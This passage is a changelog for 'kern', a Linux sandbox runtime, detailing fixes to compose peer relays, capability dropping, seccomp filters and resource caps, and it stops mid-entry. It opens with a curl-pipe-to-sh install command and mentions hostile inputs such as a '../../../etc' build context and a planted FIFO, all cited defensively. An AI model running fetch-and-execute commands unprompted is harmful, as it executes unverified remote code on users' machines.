# Changelog

**CLI stability.** As of v0.7.0 the command surface is stable: the verbs, their flags, and the
`--json` output shapes change incompatibly only on a **minor bump** (`0.8.0`+, since kern is `0.x`),
never on a patch, and only after a deprecation entry here at least one release earlier. `--json`
output is additive: new fields may appear, so consumers must **ignore unknown fields**; removing or
renaming one is the breaking change the minor-bump rule covers. A `cli_surface_is_frozen` test
snapshots the surface and fails the build on any undocumented change. Internal config-file keys may still evolve, but
scripts and SDKs written against the CLI can rely on it. Install the release binary with
`curl -fsSL https://raw.githubusercontent.com/getkern/kern/main/install.sh | sh`, or build from source
with `cargo install --git https://github.com/getkern/kern getkern --locked`. Full detail for any entry
is in the git history.

## v0.9.0 - 2026-09-04

A minor bump because one exit code changes: see the first entry. Everything else is a defect fix.

### Changed

- **`kern box --plan` now exits non-zero when a profile it named cannot attach.** It printed
  `cannot attach: no [[vcpu]] profile named 'nope'` and exited **0**, while the same command without
  `--plan` exited 1, so `kern box ... --plan && kern box ...` walked on to a launch the preview had
  already established could not happen. A script that gated on the preview and ignored its exit code
  is unaffected; a script that gated on `&&` now stops where it should have stopped before. The whole
  plan still prints and every broken profile is counted, so a configuration with three typos is fixed
  in one pass rather than three.

### Fixed

- **A `kern run` that nobody capped said nothing, and one killed by the cap said nothing either.**
  A plain `kern run` is not uncapped: the scope it re-execs into carries `MemoryMax=512M`.
  `KERN_NO_SCOPE=1` skips that scope and the default goes with it, and both existing warnings were
  gated on the caller having ASKED for a cap, so the case where nothing was typed ran in whatever
  cgroup the caller sat in and printed nothing. Measured, allocating 800 MiB against the default:
  `kern run` was killed at rc 137, `KERN_NO_SCOPE=1 kern run` completed at rc 0 with an EMPTY stderr.
  Separately, a workload the OOM killer took exited 137 with no output at all; 137 is `128 + SIGKILL`
  and SIGKILL has many senders, so on its own it told an operator nothing. Both now say what happened,
  and the OOM message is kept to what is actually measured: the killer fired in kern's cgroup subtree
  while the box ran, not which process it took.
- **An error that lists things reached the user as one run-on line.** `kern volume rm a b` printed
  `error: 2 volume(s) not removed:  no volume named 'a'  no volume named 'b'`, because the scrub that
  strips control characters stripped the newlines that made it a list. Newlines survive now and every
  continuation line is indented, so a hostile value still cannot forge a line at column 0 where kern's
  own `error:` and `hint:` prefixes live.
- **The seccomp allow-list generator promised to run `cargo fmt` and never ran it,** so `--write` left
  623 changed lines on a file whose own header says DO NOT EDIT BY HAND and turned the format check
  red. Three places also pointed at the bare command, which only CHECKS, including the failure message
  the check itself prints: following it re-ran the check and changed nothing.
- **`kern-sandbox` (Python and Node): a FIFO the box planted could stall the host's read, or fake it.**
  `read_file`/`readFile` opened `O_NOFOLLOW`, which stops a symlink, and a symlink is not the only
  thing a box can leave at a name. A box that runs `mkfifo out.png` made the host's read wait for a
  writer that never comes, with no timeout: the box decided how long the caller's call took. Adding
  `O_NONBLOCK` alone would have been worse, because a non-blocking read of a writer-less FIFO returns
  zero bytes and the call would have reported an EMPTY FILE. Both halves ship: the open is
  non-blocking AND a descriptor that is not a regular file is refused. Published as **0.1.34** on PyPI
  and npm.
- **The MCP server's memory default shadowed a profile's own.** `KERN_MCP_MEMORY_MB` defaulted to 1024
  and was sent on every call, and an explicit flag beats a profile, so a `vcpu:` profile carrying its
  own `memory=` could never apply it. Unsetting the variable did not help: it fell back to the same
  default. `0` now means "send no `--memory` at all".

## v0.8.9 - 2026-09-03

### Fixed

- **`compose start` returned while a restarted service was still unreachable, and said the opposite.**
  A live holder serving the same plan is left alone on purpose, so after `stop b; start` its relays
  are still the ones built against the box that has just been replaced. Measured: the relay halves
  keep the old pids for about 290 ms while the line above them reads `2 peer relay(s) up`. A stale
  relay ACCEPTS the connection and cannot forward it, so a bare connect sees a healthy stack and only
  a payload sees the truth: `compose start && curl peer` failed intermittently in a script while kern
  reported success.

  The holder now publishes the edges it is serving and the pids each was built against, and `start`
  waits for those to be the current ones. It also asks for the registry scan rather than waiting out
  the periodic one, which brings `start` to about 336 ms: faster than the 700 ms it took while it was
  wrong.

  Reported as a timing miss in a tight stop/start loop, read at the time as an application race. It
  was not: both the relay and the service were bound and the payload still failed.

  The test that should have caught this slept for six seconds first, so a defect lasting 1.65 s could
  never fail it. It now fetches a payload with no settling time, immediately after `start` returns.

## v0.8.7 - 2026-09-03

### Fixed

- **`compose stop` named a pod that a `--no-pod` stack never had.** The message had two states where
  there are three: on a `--no-pod` stack no pod is ever created, and "no pod holder" was read as "the
  pod collapsed", so stopping one service answered `pod '<name>' gone with its last member` while the
  other services were still running. False twice over. The behaviour was correct throughout; only the
  sentence was wrong. Reported against the released 0.8.6 binary.

### Documentation

- **`compose watch` and `compose port` reached the README.** Both shipped in 0.8.6 and neither
  appeared on the front page: `watch` was documented nowhere outside `kern --help`, and `port` only
  under `docs/`. Found by auditing the README against the released binary rather than by reading it:
  every verb and flag it uses exists, every command in it runs, and both TOML blocks pass `validate`
  and `compose config`.

## v0.8.6 - 2026-09-03

### Added

- **Peer reachability under `--no-pod`.** Services in a stack started with `--no-pod` now resolve and
  reach each other by name, without a pod and without a bridge, a DNS server or any IPAM beyond a
  per-stack counter.

  Each service gets a stack-wide loopback alias, `127.0.0.2` upward by file order. A service resolves
  its OWN name to `127.0.0.1`, where its listener is, and every peer to that peer's alias, where a
  relay is bound inside this box. One shared hosts file cannot say both, so each box gets its own
  entries; getting that line wrong is a service that cannot reach itself.

  THE RELAY IS TWO PROCESSES, because one cannot do the job. MEASURED: from inside box A's user
  namespace, `open("/proc/<B>/ns/user")` fails `EACCES`, one step before `setns` is reached. So a
  listener enters A and binds `alias:<port>`, a connector enters B and connects to `127.0.0.1:<port>`,
  and the accepted socket travels between them as an `SCM_RIGHTS` message, which works because file
  descriptors are not namespaced. Both are forked from the host namespaces before either enters
  anything, and both arm `PR_SET_PDEATHSIG` with a `getppid` re-check that closes the fork-to-prctl
  race.

  A HOLDER PROCESS OWNS THEM, for the same reason `kern __pod-holder` exists: `up` exits as soon as
  the stack is up, and relays forked by `up` would die with it seconds after being created. The plan
  travels in a file rather than argv, because a four-service stack with two ports each is 24 relays
  and a kilobyte of addresses on a command line makes every quoting rule this module's problem. It is
  fail-closed: if any relay cannot be spawned the holder reports the first failure and exits, leaving
  the boxes running, because a stack where three peers of four are reachable fails later for a reason
  nothing printed.

  A PEER ARRIVES AS ITSELF, not as loopback. The connector binds the calling service's alias as the
  SOURCE address before connecting, so the receiving service sees `127.0.0.2` for one peer and
  `127.0.0.3` for another (verified from inside a box: `netstat -tn` in the target reports the
  caller's alias). Without it every peer would arrive on `127.0.0.1`, indistinguishable from a
  connection the service made itself, and loopback is the most trusted source in most default
  configurations: a stack that asked for separation would have got localhost-equivalence back between
  exactly the pairs kern connected. The address is checked once at start-up rather than per
  connection, so a namespace where it cannot be bound is a spawn error and not a per-client mystery.

  BOTH HALVES DROP EVERY CAPABILITY once they are set up, and refuse to serve if the drop fails. The
  listener narrows to `CAP_NET_BIND_SERVICE` alone BEFORE its bind and to zero after, so the window
  that holds anything is one capability wide rather than forty-one. `PR_SET_NO_NEW_PRIVS` first, then
  `PR_CAP_AMBIENT_CLEAR_ALL` (a separate set, cleared explicitly rather than by inference), then the
  bounding set up to `cap_last_cap` READ FROM THE KERNEL rather than a hard-coded 63 (a fixed ceiling
  means EINVAL on the tail on a kernel with fewer capabilities, and this refuses to serve on a
  failure), then `capset` with `_LINUX_CAPABILITY_VERSION_3` and two data words, because version 1
  covers only capabilities 0 to 31 and this host has capabilities above 31.
  MEASURED: a process reads `CapEff: 0000000000000000` before `setns(CLONE_NEWUSER)` into a box's user
  namespace and `000001ffffffffff` after, and the halves keep the HOST mount namespace, so they are
  the only processes in the stack with a host filesystem view reachable over a socket from inside a
  box. The listener drops after its bind rather than before, because a service on a privileged port
  puts the alias bind under `CAP_NET_BIND_SERVICE`.

  THE NAMESPACE IS PINNED BEFORE IT IS TRUSTED, and by ONE `/proc/<pid>` directory descriptor rather
  than by three path resolutions. `ns/user`, `ns/net` and `stat` are reached with `openat` from that
  one descriptor, so they are the same generation by construction; the start-time comparison then only
  has to answer whether that generation is the right one. Three separate paths would be three moments:
  if the box's init exits between the first two, the second resolves against whatever now holds the
  pid, and under `watch` (which stops and restarts a service all day) the recycled process is
  plausibly another kern box, so the later start-time read can match while the two descriptors
  straddle two boxes. MEASURED on 7.0.0: `openat` on a `/proc/<pid>` directory descriptor returns
  ESRCH for `ns/net`, `ns/user` and `stat` alike once the process has exited, which is what makes the
  single-descriptor form sound. Without any of this, a listener could bind its alias on the HOST,
  reachable by everything on the machine.

  THE CONNECTOR BOUNDS ITS OWN FORKS, reaping with `WNOHANG` before each one instead of leaving
  `SIGCHLD` ignored: the kernel would reap them either way, but then nothing knows how many are live,
  and a bound needs a count. The cap is the STACK's budget of 1,024 pumps divided by the number of
  relays in the plan, floored at 16 and ceilinged at 256, because a flat per-relay number is never the
  binding constraint: 256 across the 24 relays of a four-service, three-port stack is 6,144 processes,
  which meets `RLIMIT_NPROC` and the cgroup `pids` limit long first. This relay's listening socket is
  inside a box, so the party that can saturate it is a container.

  THE HOLDER REPAIRS ITS RELAYS instead of sleeping through their deaths or ending the stack over one
  of them. A dead half takes its own edge down and the edge is rebuilt against the namespaces that
  exist now; a box whose PID 1 has moved has exactly the edges touching it rebuilt. Every rebuild is
  logged, including one that succeeds first time, because an edge that dies twice a minute would
  otherwise look healthy. An edge that keeps failing is named in a `degraded` file that
  `kern compose ps` prints as `peer edge DOWN`, and it is still retried, so a service that is merely
  restarting brings its edges back with no command run. Fail-closed still applies at SPAWN, where a
  plan that cannot be realised is a stack-level fact `up` reports.

  BOTH HALVES INSTALL A SECCOMP FILTER after shedding their privileges, and the per-connection pumps
  inherit it through `fork`. It is a DENYLIST where a box gets an allowlist: a box runs arbitrary
  tenant code, while a half runs this crate in a straight line and parses no tenant bytes, and an
  allowlist over its syscall set would have to be right on every architecture kern publishes, where
  musl picks spellings per target. Denied are the calls that make a host mount view worth anything:
  `execve`, the file-opening family, `mount`, `ptrace`, `process_vm_*`, `setns`, `unshare`, `bpf` and
  the module calls. Verified on x86_64 and on a Raspberry Pi 5: every half reads `Seccomp: 2`,
  `NoNewPrivs: 1` and all four capability sets empty, while a service on port 80 still serves.

  A SHARED INTERNAL PORT COSTS ONLY THE WILDCARD SIDE, and which side that is is MEASURED rather than
  assumed. On one port, two SPECIFIC binds on different addresses do not conflict, while a specific
  bind and a WILDCARD bind refuse each other in both orders, `SO_REUSEADDR` or not. A compose file
  declares a port and never an address, so the plan cannot decide it; the holder reads
  `/proc/<pid1>/net/tcp` for the box that would HOST each relay, after the services have bound, and
  that reports the pid's network namespace so it needs no `setns` and no privilege.

  A wildcard listener owns every address on its port, so that direction is named with both remedies. A
  specific listener leaves the alias free, so that direction is served. Verified end to end with two
  services both declaring 8080, one binding `127.0.0.1:8080` and one binding `0.0.0.0:8080`: the first
  reaches the second, and only the reverse is reported down. A service that has NOT bound yet is a
  third answer rather than "specific", because binding the alias then would make its own later
  `bind(0.0.0.0)` fail and the loser of that race would be the user's application; those are deferred
  and re-measured, so a service that restarts bound differently changes the answer with no command
  run.

  `kern compose ps` prints every direction that is down, with its reason.

  MEASURED COST: on a four-service stack with 12 relays, `up --no-pod` is not slower than `up` in a
  pod (186 ms against 191 ms, mean of three, debug binary, so the absolute figures are not comparable
  with the published benchmarks).

  `relays/` is AUTHORITATIVE in the registry's classification, deliberately: a box able to write a
  line into a plan would redirect where a PEER's traffic goes, and a box able to rewrite the holder
  pid would aim `compose down`'s kill at a process of its choosing.

- **`kern compose <file> watch [service...]`**: rebuild and restart ONE service when its `build:`
  context changes, and nothing else. Blocks until Ctrl-C, printing the cycle time. MEASURED on this
  desktop, a full edit-to-serving cycle for a one-instruction image: **258 to 261 ms**, of which the
  restart is the small part.

  It exists because the speed a stack starts with is a number a developer reads once and never feels:
  a stack goes up in the morning and stays up. The loop that runs dozens of times a day is edit,
  rebuild, restart, and without this one kern was WORSE than the alternative there, because that loop
  had to be driven by hand.

  WHAT IS WATCHED is each service's `build.context`, recursively, and it is not configurable on
  purpose: the context is already the set of files that decides the image's content, so watching it
  is watching exactly what a rebuild would read. No `develop.watch` key is invented. A service with
  no `build:` is excluded and the refusal says why, rather than a terminal that looks busy and can
  never fire.

  THE CYCLE IS THREE EXISTING VERBS: `kern build`, `kern stop` for the one box, and
  `kern compose <file> start`, which launches what is not running and leaves the peers alone. The
  module decides WHEN, never HOW, so nothing about building or starting is reimplemented behind a
  second door.

  Nine failure modes are handled and written down where the code is, rather than found later: inotify
  absent (refused with the errno), the watch limit (`ENOSPC` reported with the sysctl to raise, and
  refused rather than watching half a tree), editors that save by rename (`IN_MOVED_TO`, not
  `IN_CLOSE_WRITE` alone), directories created after start (each gets its own watch, since inotify
  does not recurse), event storms (folded into a per-service dirty bit in a fixed stack buffer),
  queue overflow (`IN_Q_OVERFLOW` rebuilds everything, because the kernel will not say what it
  dropped), an edit during a build (read afterwards, not lost and not a second build), Ctrl-C (a flag
  the poll loop observes, so no build dies halfway), and a context that escapes the project.

  That last one is shared rather than repeated: the confinement `resolve_builds` applies is now
  `resolved_build_context`, called by both. A second reader of `build.context` with its own traversal
  check is the shape in which one copy later stops refusing `context: ../../../etc`.

  `eintr::read` joins `waitpid` and `poll` in that module for the same reason they are there: a
  signal delivered while the inotify read blocks returns `EINTR`, and a caller reading -1 as "no
  events" would stop rebuilding after the first `SIGWINCH`.

- **A relay refusal bundled two unrelated causes into one sentence.** "the two boxes share one
  network namespace (or their namespaces could not be read)" fired on a real host because a service
  had DIED, and the message sent four rounds of diagnosis hunting a namespace problem that did not
  exist. The two have nothing in common: one means the caller handed kern a `--net` box, the other
  means a box is gone and its logs are where the answer is. They are now separate messages, and the
  second names the pid.

- **`kern --help` now describes `compose watch` and `compose port`.** Both verbs shipped listed in the
  compose verb line and explained nowhere, so a reader saw `watch|port` and had to guess. Two lines,
  in the same column as their neighbours. `cli_surface_is_frozen` was regenerated deliberately: the
  diff is two added lines and nothing removed or renamed, which is what "additive" has to mean for a
  surface declared stable.

- **`kern compose <file> port <service> <container-port>`**, the twin of `docker compose port`. It
  prints the host address serving that box port, on stdout and alone, and exits non-zero when there
  is no answer: the service is not running, it publishes nothing, or that container port is not among
  what it published. The exit code is the contract as much as the output, because the shape this
  serves is `addr=$(kern compose f port web 8000) || exit 1`.

  READ FROM THE RUNNING BOX, NOT FROM THE FILE. The file says what was asked for and the registry
  says what was actually bound; a stack brought up from a since-edited file would otherwise print an
  address nothing serves. The cost is that the service has to be running, which is what
  `docker compose port` requires too.

  Additive: no verb, flag or `--json` shape changed meaning, and `cli_surface_is_frozen` was updated
  deliberately for the one new sub-verb rather than by accident.

  Two things this needed on the way. `ports::parse_display` is now the documented INVERSE of
  `ports::fmt`, living beside it with a round-trip test, because the published mapping is stored as
  the string `fmt` produced and a hand-rolled split at each reader is how one of them ends up
  disagreeing with the writer; it is total, allocation-free, and refuses fifteen malformed shapes by
  test. And the service selection upstream, which rewrites every positional into a scoped box name,
  now knows that `port` takes `<service> <port>`: it used to report a mistyped NUMBER as an unknown
  service, sending the reader to look for something their file never contained.

### Changed

- **`compose stop`, `start` and `restart` now act on the services you name.** `[service...]` was in
  the CLI surface and validated on the way in, then dropped: `kern compose stack.toml stop b` on an
  a/b/c stack stopped all three and reported "3 box(es) stopped" for the one name given, and
  `start b` launched all three. An argument that is accepted and not honoured is the same class of
  defect as a resource cap that is accepted and not enforced.

  `up <service>` expands to what that service depends on, or it starts a service against a database
  that was never launched. `stop`, `start` and `restart` do NOT expand, because there the named
  services are the whole instruction and pulling in a dependency would touch something you did not
  name. This is Docker Compose's split, and the behaviour scripts written against Compose expect.

  IF YOU RELIED ON `stop <service>` STOPPING THE WHOLE STACK, drop the argument: `compose stop` with
  no names still stops everything, exactly as before.

### Fixed

- **`kern stop` could report a foreground box as unconfirmed while it kept running.** `signal_box`
  discarded the result of `pidfd_send_signal`, so a call that never delivered was indistinguishable
  from one that did. For a foreground box that syscall is the whole teardown: its init is not a
  process-group leader, so the `kill(-pid)` sweep beside it is a harmless ESRCH. Where a sandbox
  policy filters the syscall, nothing reached the init. It now falls back to a plain `kill` on every
  errno except ESRCH, which is the one case where the pid may already belong to someone else, and
  which is the reuse the pidfd exists to rule out. Reported by an external reviewer on a host none of
  the maintainers has.

- **A blocked peer edge named the wrong wildcard address.** The report said "it listens on 0.0.0.0"
  and advised binding `127.0.0.1` whatever the service had actually bound, so a service listening on
  `::` was told to look for a string that is not in its compose file and to move to an address an
  IPv6 listener never owns. The address is now the one the kernel reported, and the remedy is the
  loopback of that same family. The healing loop and the first pass also worded the same fact
  differently, and only the first offered a fix; both now go through one report.

- **Three tests failed as root, or with `/tmp` on overlayfs.** Two pin a bug whose fixture is an
  unwritable directory, and root's `CAP_DAC_OVERRIDE` walks straight through it, so the positive
  control could not be armed; they now skip only that control, say so, and still assert the fix. The
  third assumed `/tmp` is never overlayfs, which is false in any container that overlays it; it now
  requires `statfs` to agree with `/proc/mounts`, an independent channel, so it holds in both
  environments and skips in neither.

- **`kern compose <file> up` without `--no-pod`, on a stack running without one, silently moved it
  back into a pod.** The plan file on disk is how a stack remembers its mode, and `start` carries it,
  but `up` without the flag is ambiguous: a forgotten flag, or a deliberate move back. Both readings
  are defensible, which is exactly when inferring is wrong. It now refuses, names the plan file, and
  gives both ways forward. The check sits BEFORE the reconciler, because `up` on a stack whose
  definitions still match returns "already up to date" and exits 0 without reaching anything after it.

- **`kill_holder` signalled the previous relay holder and returned without waiting for it to die.**
  The holder is not a child, so there is no `waitpid`; the caller then spawned a replacement while the
  old holder's `PDEATHSIG` cascade was still tearing down relays in the same boxes, with the new
  relays binding aliases the dying ones still held. That race is near-invisible on a hand-run `start`
  and constant under `watch`, which performs the sequence on every save.

- **Every box start paid for a garbage collection it did not need.** Deciding which cgroup path to
  cap through called `ensure_kern_slice`, whose fast path swept the slice for cgroups left by boxes
  whose supervisor had been killed. That sweep stats `/proc/<pid>` per entry, so its cost grows with
  the slice, and MEASURED with 61 entries it was **193 us, 7.4% of a 2.6 ms box start**, in front of
  every box. Orphans are rare by construction: a box that stops normally removes its own cgroup, so
  only a killed supervisor leaves one. It now runs AFTER the spawn, overlapping the workload rather
  than preceding it, and the slice is swept just as often.

  `parent:config+volumes` fell from **288 us to 93 us**. The runtime directories are also resolved
  once per process instead of on every helper that needs one, which halved the `mkdir`s that return
  EEXIST; the memo runs BELOW the registry classification chokepoint, because the first version
  returned early and skipped it, and three tests said so.

  Interleaved against bubblewrap, 16 alternating batches of 50 runs on the same machine: kern
  **2.412 ms** uncapped and **2.425 ms** capped against bubblewrap's **2.655 ms**, about 9% either
  way, and the capped one is the default and does strictly more (a real cgroup cap, a registry entry,
  a masked `/proc`). Repeated across sessions the edge lands between 5 and 11% depending on machine
  load, and the ranges overlap, so it is a median edge rather than a separation.

- **A `--no-pod` stack could ask for more processes than the host allows.** The relay mesh is
  quadratic and the 253-service alias range does not bound it: 253 services with one port each is
  63,756 relays and 127,513 processes, against an `RLIMIT_NPROC` of 126,965 on the machine this was
  measured on. `up` now refuses past 1,024 relays, BEFORE starting anything, and states the count, the
  process cost and the way out. Measured to set it: 32 services is 992 relays, 1,987 processes, 474 MB
  resident and 1.54 s.

- **The relay holder burned 2.75% of a core on an idle stack.** It read and pruned the whole registry
  every 250 ms to notice a box that had restarted, and asked twice per relay. MEASURED on an
  eight-service stack with 56 relays, release build. The two things it watches cost very differently:
  reaping a dead child is a `waitpid` that costs nothing, while a restart scan needs the registry. The
  rates are now separate (2 s for the scan, unchanged for the reap, and an immediate read whenever a
  child died or an edge is waiting), which measures at **0.10%** with the rebuild still landing on the
  next pass. Their relationship is a `const` assertion, so collapsing them again does not compile.

- **`kern compose ps` named peer edges as down for a holder that no longer existed.** `degraded` is
  written by the holder and removed by `down`; a holder that is killed leaves it behind, and the view
  read the file rather than asking whether a holder owns it. Same stale-state class as the mode
  inference, now closed the same way: the liveness of a process, not the presence of a file.

- **A service declaring only UDP ports was unreachable under `--no-pod`, silently.** A peer relay is a
  `SOCK_STREAM` pump, so UDP ports were filtered out of the address plan with no report: a `statsd` or
  a DNS service simply had no peers and nothing said so, which is the accepted-and-ignored shape this
  codebase treats as a defect. `up` now names any service whose only declared ports are UDP, and any
  service that keeps its TCP ports while losing its UDP ones.

- **Every peer edge of a multi-service `--no-pod` stack was reported blocked.** The holder decides
  each relay by measuring what the hosting box bound, and "nothing is listening on that port" was read
  as the racy case for every pair. It is only racy when the host DECLARES the port and has not bound
  it yet; a service that never uses that port will never bind it, so the alias is free forever. With
  the declaration missing from the decision, a four-service stack came up with twelve blocked edges,
  all of them fine. Found by running a stack shaped like a real one, which is now a test: `db` and
  `cache` behind an `api` behind a `web`, asserting a fetched body over every hop.

- **The relay plan parser accepted box names a box cannot have.** `relays/` is AUTHORITATIVE in the
  registry's classification precisely because a line written into it redirects where a PEER's traffic
  goes, so the parser is a boundary; it checked names for emptiness and nothing else, and accepted a
  space, a path separator or a terminal escape. It now applies the same `[A-Za-z0-9_.-]` charset the
  rest of the tree uses, through the single function that states it.

- **A relay pump outlived the teardown that was supposed to remove it.** `PR_SET_PDEATHSIG` is not
  inherited across `fork`, so the two relay halves died with the holder while the per-connection pumps
  did not. MEASURED: killing the holder left one process alive, still holding a connection open
  between two boxes' namespaces, and a peer blocked in `read` never saw the connection end.
  `compose down` takes the same path, so a stack could be brought down and still be relaying. Each
  pump now arms `PDEATHSIG` against the connector.

  Measuring the consequence answered a question that had been recorded as unmeasured: a peer observes
  a clean FIN and end-of-file when the relay goes, not a reset, so the correct client response is a
  reconnect.

- **A relay listener kept `CAP_NET_BIND_SERVICE` in its bounding set after claiming every set was
  empty.** The listener narrows to that one capability before its bind and drops to zero after, and
  the narrowing skipped `mask`'s bits in the `PR_CAPBSET_DROP` loop. The second call could then not
  remove the bit, because `PR_CAPBSET_DROP` needs `CAP_SETPCAP` in the effective set and the first
  call had just dropped it. MEASURED on a live stack: `CapBnd: 0000000000000400` with `CapEff: 0`.

  The exposure was nil, since the bounding set only limits what can be GAINED across an `execve` and
  `NO_NEW_PRIVS` was already set. The defect was the claim. Dropping the whole bounding set in the
  first call is correct, because removing a capability from the bound does not remove it from
  permitted or effective, so the privileged-port bind still works: verified with a service on port 80,
  which serves its peer while all four halves read `CapEff`, `CapPrm`, `CapBnd` and `CapAmb` as zero.

  It was found by measuring a claim rather than by reading the code, and it is the composition of two
  changes that are each correct alone.

- **A `--no-pod` stack lost every peer when ONE service restarted, silently.** Relays are pinned by
  `setns` to namespaces obtained when the stack came up; a restarted service gets a new one, and the
  relay halves sitting in the old one keep it alive rather than erroring. MEASURED: `kern compose
  <file> start` after stopping one service exited 0, printed nothing, and `nc -w 3 peer PORT` still
  SUCCEEDED, because the relay's listener is up in the box that did not restart and accepts before
  discovering it has nowhere to forward to. Only a request that fetches a BODY shows it.

  `kern compose <file> watch` runs exactly that cycle on every edit, so the combination that broke is
  the one shipped to be run all day.

  A stack now remembers that it is a no-pod stack (the relay plan on disk is that memory, and `down`
  removes it), `start` keeps the mode and says so, and the relays are re-established against the
  namespaces that exist now.

- **`kern compose <file> start` deleted the relay plan it had just written.** `spawn_holder` wrote the
  plan and then killed the previous holder, and `kill_holder` removes the plan, the pid file and the
  directory. It never fired on a fresh `up`, where there is no holder file and `kill_holder` returns
  before deleting anything; it fired on every `up` against a running stack and every `start` after
  one, as `peer relays: cannot read the relay plan`.

- **`kern compose <file> ps` reported every service of a `--no-pod` stack as not running.** The view
  filters the registry by pod, and a no-pod box carries an empty pod field, so a stack with two boxes
  up and visible in `kern ps` printed `0/2 services running`. A status view that reports a running
  service as gone is worse than one that refuses, because it is what a person consults to decide
  whether something is wrong.

- **`kern compose up --no-pod` never returned under a pipe.** The relay holder inherited the caller's
  stderr and its relay children inherited the same descriptor, so processes that outlive the command
  by hours held the write end open. The pod path, which spawns no holder, closed and returned; that
  contrast is what identified it.

- **Concurrent `kern box -d` children garbled their confirmation lines.** `stderr` is unbuffered, each
  fragment of a format is its own `write`, and nothing locks a descriptor across processes, so two
  services starting in one level produced `✔✔ started started ''a b''`. One string, one write.


- **A compose error listed scoped box names to a reader who typed service names.** `no service 'x' in
  file (services: pod-token-web)` answered a typo with names the file does not contain. It lists what
  the file calls them now.

### Documentation

- **README and BENCHMARKS.md gave different numbers for the same measurement.** One said kern and
  bubblewrap both cold-start at ~2.3 ms and runc at ~18.6; the other said 2.7 / 2.7 / 14.0. Both now
  carry one clean run of `examples/benchmark.py`: kern 2.7 ms, bubblewrap 3.0, runc 14.2, podman
  288.1, docker 295.9. Two sentences were wrong beyond the digits. "kern and bubblewrap sit inside
  each other's noise" no longer holds, because the ranges do not overlap; and "kern's figure includes
  a real cgroup cap" was never true of that column, which is the bare box precisely so that it is the
  same job as bwrap. The namespace-matched bwrap invocation is now published beside the table.

- **kern against bubblewrap on aarch64**, which had never been measured. On a Jetson Orin Nano and an
  Arduino UNO Q, at equal work kern is 21% faster; by default it is slower, because over SSH the
  login cgroup sits outside `user@<uid>.service`, kern's delegated slice refuses a `memory.max`
  write, and a `systemd-run --user --scope` per box is the only way to cap there at all.

## v0.8.5 - 2026-09-01

### Added


- **A `docker-compose.yml` can name a `kern.toml` resource profile**, through the Compose
  Specification's own extension fields: `x-kern-vcpu`, `x-kern-vdisk`, `x-kern-vgpio`. They resolve
  to the `vcpu:`/`vdisk:`/`vgpio:` tokens `kern box` already takes positionally, so the whole chain
  downstream is the one the TOML spelling has always used, and `leds` and `vgpio:leds` name the same
  profile.

  WHAT THEY BUY, checked field by field rather than assumed. `cpus`, `cpuset` and `mem_limit` are
  already honoured inline and need no profile. A `vcpu` profile also carries `numa`, `nice`,
  `backend` and `extends`; a `vdisk` carries `size`, `persistent`, `backend`, `iops` and `bandwidth`;
  a `vgpio` carries nineteen device classes. None of those has a compose spelling. An earlier draft
  read only `x-kern-vgpio`, on the grounds that `cpus`/`cpuset` were covered inline: that was two
  fields out of seven, and a surface that reads one key while silently dropping its two obvious
  siblings teaches a pattern that then does nothing.

  `x-kern-vgpio` is the one with no equivalent anywhere. A compose file reaches GPIO today by writing
  `devices: /dev/gpiochip0`, so the service file decides which hardware it may touch. With a profile
  the service declares intent and `kern.toml` holds the grant, so the operator decides what `leds`
  resolves to on this host, which matters because the grant is chip-granular rather than per-line.

  THE FILE STAYS PORTABLE, THE GRANT DOES NOT, and that is documented rather than left to be
  discovered. `x-` is the spec's extension mechanism: Docker Compose v2 validates a file carrying
  these keys and echoes them back unchanged, measured against 29.6.2, so one file runs on both
  runtimes. It runs there WITHOUT the profile, and nothing says so, which is why
  `docs/DOCKER-COMPAT.md` now says to keep anything a workload needs for correctness in the inline
  fields both runtimes enforce.

  A compose file NAMES a grant, it does not create one: letting the file create the profile would
  hand the hardware decision back to whoever wrote the service, which is the thing this splits apart.

- **`x-kern-security-profile: untrusted` in a compose file.** The opt-in hardening bundle (seccomp
  allowlist, `--cap-drop ALL`, `--read-only`) under one name, and the only one of these keys that
  needs no `kern.toml`. Compose has no way to say "this code is not trusted", and the three flags it
  would take instead are easy to get half-right. Measured on a service carrying it: `touch` in the
  rootfs answers `Read-only file system` and `CapEff` reads `0000000000000000`. The VALUE is not
  validated in the compose crate: `kern box` owns that vocabulary and already refuses an unknown one
  by name, and a second copy of the list is how the two come to disagree.

- **An unrecognised key in the `x-kern-` namespace is named rather than ignored.** The spec says a
  tool must ignore the extension fields it does not understand, and every other vendor's prefix still
  is, but this one is kern's: `x-kern-vgpi` (a typo) and `x-kern-vgpu` (a kind this build does not
  have) would otherwise do nothing and say nothing, which is the defect the whole mechanism exists to
  avoid. The message lists what this build does read.

  `vgpu` is deliberately ABSENT from the kind list rather than listed and dead: `classify` does not
  know a `vgpu:` token here, so the CLI would answer `unexpected argument` on a token the compose
  crate had happily built. `PROFILE_KINDS` is the one place that decides, read by both the token
  builder and the YAML reader, so adding it later is one entry plus one field. A test asserts the
  list's contents, so that stays a decision rather than something a future edit does by accident.

### Changed


- **The block-scalar chomping indicator now decides something, and that changes existing files.**
  `|`, `|-` and `|+` all produced the same value: every trailing blank line was dropped and nothing
  was added back. MEASURED on an `environment` value of `ab` delivered into a running box, all three
  arrived as 2 bytes where YAML says 3, 2 and 4. Default now keeps exactly one break, `-` none, `+`
  all of them; an empty body still gets none, because there is no content for a break to follow.

  FILED UNDER CHANGED, NOT FIXED, because a value that already worked can now differ by trailing
  newlines - the default `|` gained one. The blast radius was measured rather than assumed: no block
  scalar appears in any content kern itself parses, and of the 6 fixtures that use one in the test
  suite, 2 encoded the old behaviour and now encode YAML's. A stack whose `command` or `environment`
  ends in a block scalar is where an operator would notice.

- **A compose file that names a `vgpio` profile is now refused unless the person running it says so
  on the command line** (`--allow-device-grants`). Every other profile kind NARROWS: the file names a
  want, `kern.toml` holds the grant, and the local grant is a ceiling, so "the local one wins" is
  conservative by construction. A `vgpio` profile does not narrow, because its resolution is a DEVICE
  rather than a bound and device nodes have no ordering: `/dev/gpiochip0` is not a smaller
  `/dev/gpiochip1`, and one host's `leds` may be an LED where another's is a relay board. The refusal
  names the exact paths. The gate is on the property (did this resolve to a device?) and not on a list
  of kinds, so a future kind resolving to hardware inherits it; the acknowledgement is a command-line
  flag, where a downloaded file cannot reach.

### Fixed

- **A one-shot service that succeeded failed the stack.** `compose up` is fail-closed on bring-up: a
  service that dies inside the settle window is reported and the command exits non-zero. The carve-out
  for a service that finished CLEANLY is decided by its recorded exit code, and that code was handed to
  the box only when some peer waited on it with `depends_completed`. For every other service no record
  was written, the lookup answered "no record", and the carve-out could never fire. MEASURED from a
  field report on v0.8.5: a service running `/bin/echo` and exiting 0 was reported as "died within
